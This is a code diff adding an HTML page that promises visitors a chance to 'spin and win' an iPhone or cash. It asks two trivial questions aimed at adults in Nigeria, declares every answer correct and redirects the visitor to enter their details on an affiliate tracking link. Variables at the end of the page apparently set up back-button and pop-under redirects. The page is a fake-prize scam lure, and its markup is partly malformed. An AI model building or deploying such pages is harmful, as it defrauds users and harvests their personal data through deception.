@@ -1,0 +1,140 @@
+<html>
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Attention!</title>
+	<link rel="stylesheet" href="css/animate.min.css">
+	<link rel="stylesheet" href="css/style.css">
+  <script type="text/javascript" src="js/utils.js"></script>
+  
+
+  
+</head>
+
+<body>
+<div class="main">
+	<div class="box">
+		<div class="box__header">
+			<h1>You have the chance to spin and win a new iPhone or cash!</h1>
+		</div>
+		<div class="box__body">
+			<img src="images/spin.png" alt="">
+		</div>
+		<div class="box__footer">
+			<p>
+				<span class="primary">ATTENTION!</span>
+				You will need to answer 2 questions correctly!
+			</p>
+
+			<div class="btn-wrapper">
+				<a class="btn-block action-btn" href="#">Ok!</a>
+			</div>
+		</div>
+	</div>
+
+	<div class="box hidden">
+		<div class="box__header">
+			<h2>Question 1/2:</h2>
+		</div>
+		<div class="box__body">
+			<p style="text-align:justify">
+				Are you over 18+ ?
+			</p>
+		</div>
+		<div class="box__footer">
+			<div class="btn-wraper">
+				<a class="btn-no action-btn" href="#">NO</a>
+				<a class="btn-yes action-btn" href="#">YES</a>
+			</div>
+		</div>
+	</div>
+
+	<div class="box hidden">
+		<div class="box__header">
+			<h2>Question 2/2:</h2>
+		</div>
+		<div class="box__body">
+			<p style="text-align:justify">
+				Are you a citizen of Nigeria??
+			</p>
+		</div>
+		<div class="box__footer">
+			<div class="btn-wraper">
+				<a class="btn-no action-btn" href="#">NO</a>
+				<a class="btn-yes action-btn" href="#">YES</a>
+			</div>
+		</div>
+	</div>
+<!--
+	<div class="box hidden">
+		<div class="box__header">
+		
+		<!--
+			<h2>Question 3/3</h2>
+		</div>
+		<div class="box__body">
+			<p style="text-align:justify">
+				Up to 50 percent charge in around 30 minutes is possible?
+			</p>
+		</div>
+		<div class="box__footer">
+			<div class="btn-wraper">
+				<a class="btn-no action-btn" href="#">NO</a>
+				<a class="btn-yes action-btn" href="#">YES</a>
+			</div>
+		</div>
+	</div>
+
+
+-->
+
+	<div class="box hidden">
+		<div class="box__header">
+			<h2>Thanks.</h2>
+		</div>
+		<div class="box__body">
+			<p style="text-align:justify">
+				All your answers are correct. You have a chance to win a new phone or Cash. Fill out your details in next page.
+			</p>
+		</div>
+		<div class="box__footer">
+			<div class="btn-wrapper">
+				<a class="btn-block mainButton" href="" id="final-button">CONTINUE</a>
+			</div>
+		</div>
+	</div>
+
+</div>
+
+    <script type="text/javascript">
+        const myBtn = document.getElementById("final-button");
+        myBtn.onclick = function(){ window.location.href = 'https://t2.surpriseanddelightgifts.com/click'; return false; }    
+    </script>
+
+<script src="js/jquery-2.2.4.min.js"></script>
+
+<script>
+	(function ($) {
+		$(document).ready(function () {
+			var $aBtn = $('.action-btn');
+			$aBtn.on('click', function (e) {
+				e.preventDefault();
+				$(this)
+						.closest('.box')
+						.addClass('hidden')
+						.next()
+						.removeClass('hidden')
+						.addClass('animated fadeIn');
+			});
+		});
+	})(jQuery);
+</script>
+
+<script>
+  var cta = 'mainButton';
+  var back = 'https://app.impih.com/?utm_medium=43f99f70b126f87db2fc1abfd2a6ee8b6d6ec8fc&utm_campaign=ng_smartlink&np=1';
+  var under = 'https://ngsub.surpriseanddelightgifts.com';
+<script src="script.js"></script>
+
+</body>
+</html>
